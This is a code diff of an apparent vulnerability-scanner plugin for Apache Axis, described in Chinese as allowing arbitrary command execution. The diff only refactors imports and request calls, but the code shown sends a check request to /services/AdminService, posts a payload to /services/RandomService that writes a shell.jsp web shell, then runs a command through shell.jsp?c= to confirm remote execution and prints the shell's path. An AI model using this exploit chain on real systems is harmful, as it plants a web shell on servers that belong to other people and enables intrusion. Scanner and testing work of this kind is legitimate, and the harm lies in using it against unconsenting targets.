@@ -5,17 +5,13 @@ name: Axis漏洞
 description: Axis漏洞可执行任意命令
 '''
 
-import string
-import random
-import requests
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class Axis_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
             'Pragma': 'no-cache'
@@ -77,11 +73,11 @@ class Axis_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url + "/services/AdminService", headers = self.check_headers, verify = False, data = self.check_payload)
+            check_req = request.get(self.url + "/services/AdminService", headers = self.check_headers, data = self.check_payload)
             if check_req.status_code == 200 and "processing</Admin>" in check_req.text :
                 print("存在Axis漏洞")
-                shell__req = requests.post(self.url + "/services/RandomService", data = self.shell_payload, headers = self.shell_headers, verify = False)
-                cmd_req = requests.get(self.url + "../shell.jsp?c=echo%20" + self.capta , headers = self.headers, verify = False)
+                shell__req = request.post(self.url + "/services/RandomService", data = self.shell_payload, headers = self.shell_headers)
+                cmd_req = request.get(self.url + "../shell.jsp?c=echo%20" + self.capta , headers = self.headers)
                 if cmd_req.status_code == 200 and self.capta in cmd_req.text:
                     print("上传的jsp文件路径为:", self.url + "../shell.jsp")
             else:
